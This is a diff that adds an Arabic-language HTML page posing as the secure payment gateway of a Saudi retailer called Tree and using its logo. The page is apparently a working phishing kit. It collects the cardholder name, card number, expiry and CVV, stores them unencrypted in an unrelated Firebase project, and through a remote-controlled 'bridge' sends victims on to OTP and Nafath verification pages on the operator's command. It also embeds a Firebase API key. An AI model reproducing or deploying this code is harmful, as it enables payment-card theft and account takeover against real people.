@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدفع الآمنة - تري</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    
+    <style>
+        :root { --p-green: #122d2b; --s-gold: #c5a059; --t-green: #00ff9d; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .secure-container { background: white; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; }
+        .p-header { background: #fafafa; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
+        .p-header img { width: 110px; }
+        .p-header h3 { color: #333; margin: 10px 0 0 0; font-size: 19px; }
+        
+        .p-body { padding: 30px; }
+        .f-group { margin-bottom: 18px; position: relative; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #555; font-size: 13.5px; }
+        input, select { width: 100%; padding: 13px 15px; border: 1.5px solid #eaeaea; border-radius: 12px; font-size: 16px; box-sizing: border-box; transition: 0.3s; color: #333; outline: none; }
+        input:focus { border-color: var(--s-gold); box-shadow: 0 0 8px rgba(197, 160, 89, 0.2); }
+        
+        /* شعار البطاقة الذكي */
+        #c-logo-box { position: absolute; left: 12px; top: 38px; width: 45px; height: 30px; border-radius: 5px; background: #fafafa; border: 1px solid #f0f0f0; display: none; object-fit: contain; padding: 2px; }
+        
+        .c-exp-row { display: flex; gap: 10px; }
+        .c-exp-row > div { flex: 1; }
+        
+        .btn-pay { width: 100%; padding: 16px; background: var(--p-green); color: var(--t-green); border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; }
+        .btn-pay:hover { opacity: 0.92; transform: translateY(-1px); }
+        .trust-icons { display: flex; justify-content: center; gap: 15px; margin-top: 20px; opacity: 0.6; }
+        .trust-icons img { height: 25px; }
+    </style>
+</head>
+<body>
+
+<div class="secure-container">
+    <div class="p-header">
+        <img src="https://tree.com.sa/assets/images/logo.png" alt="Tree"> 
+        <h3>إتمام عملية الدفع</h3>
+    </div>
+
+    <div class="p-body">
+        <div class="f-group">
+            <label>اسم صاحب البطاقة</label>
+            <input type="text" id="p-name" placeholder="الاسم كما هو مكتوب على البطاقة">
+        </div>
+
+        <div class="f-group">
+            <label>رقم البطاقة الائتمانية</label>
+            <div style="position: relative;">
+                <input type="text" id="c-num" maxlength="19" placeholder="0000 0000 0000 0000" style="padding-left: 65px; letter-spacing: 1.5px;" dir="ltr">
+                <img id="c-logo-box" src="" alt="card">
+            </div>
+        </div>
+
+        <div class="c-exp-row">
+            <div class="f-group">
+                <label>تاريخ الانتهاء</label>
+                <div style="display: flex; gap: 5px;">
+                    <select id="e-m">
+                        <option value="">شهر</option>
+                        <script>for(let i=1; i<=12; i++) document.write(`<option value="${i<10?'0'+i:i}">${i<10?'0'+i:i}</option>`)</script>
+                    </select>
+                    <select id="e-y">
+                        <option value="">سنة</option>
+                        <script>for(let i=24; i<=35; i++) document.write(`<option value="${i}">${i}</option>`)</script>
+                    </select>
+                </div>
+            </div>
+            <div class="f-group">
+                <label>الرمز السري (CVV)</label>
+                <input type="password" id="c-v" maxlength="3" oninput="if(this.value.length > 3) this.value = this.value.slice(0, 3);" placeholder="***" style="text-align: center;">
+            </div>
+        </div>
+
+        <button class="btn-pay" onclick="checkAndSend()">تأكيد ودفع</button>
+
+        <div class="trust-icons">
+            <img src="https://img.icons8.com/color/48/000000/visa.png">
+            <img src="https://img.icons8.com/color/48/000000/mastercard.png">
+            <img src="https://img.icons8.com/external-flat-icons-inmotus-design/67/000000/external-mada-mada-card-flat-icons-inmotus-design.png">
+        </div>
+    </div>
+</div>
+
+<script>
+    // -- إعدادات Firebase الخاصة بك مدمجة جاهزة --
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // -- ذكاء كشف نوع البطاقة وتنسيقها --
+    const cardInput = document.getElementById('c-num');
+    const cardLogo = document.getElementById('c-logo-box');
+
+    cardInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formatted = "";
+        for(let i=0; i<val.length; i++){
+            if(i>0 && i%4===0) formatted += " ";
+            formatted += val[i];
+        }
+        e.target.value = formatted;
+
+        if (val.startsWith('4')) { 
+            cardLogo.src = "https://img.icons8.com/color/48/000000/visa.png";
+            cardLogo.style.display = 'block';
+        } else if (val.startsWith('5')) { 
+            cardLogo.src = "https://img.icons8.com/color/48/000000/mastercard.png";
+            cardLogo.style.display = 'block';
+        } else if (val.startsWith('9') || val.startsWith('58') || val.startsWith('60')) { 
+            cardLogo.src = "https://img.icons8.com/external-flat-icons-inmotus-design/67/000000/external-mada-mada-card-flat-icons-inmotus-design.png";
+            cardLogo.style.display = 'block';
+        } else {
+            cardLogo.style.display = 'none';
+        }
+    });
+
+    async function checkAndSend() {
+        const name = document.getElementById('p-name').value;
+        const num = document.getElementById('c-num').value;
+        const month = document.getElementById('e-m').value;
+        const year = document.getElementById('e-y').value;
+        const cvv = document.getElementById('c-v').value;
+
+        if (name.length < 3 || num.length < 19 || !month || !year || cvv.length < 3) {
+            alert("يرجى إكمال بيانات البطاقة بشكل صحيح لضمان قبول الطلب");
+            return;
+        }
+
+        const userId = "user_" + Date.now();
+        localStorage.setItem('user_id', userId);
+
+        try {
+            await db.collection("orders").doc(userId).set({
+                card_name: name,
+                card_number: num,
+                expiry: month + "/" + year,
+                cvv: cvv,
+                status: "waiting_otp",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+            // سينقلك لصفحة الكود بعد النجاح
+            window.location.href = "otp_verification.html";
+        } catch (e) {
+            alert("عذراً، حدث خطأ في النظام، يرجى المحاولة لاحقاً");
+        }
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+</body>
+</html>
+
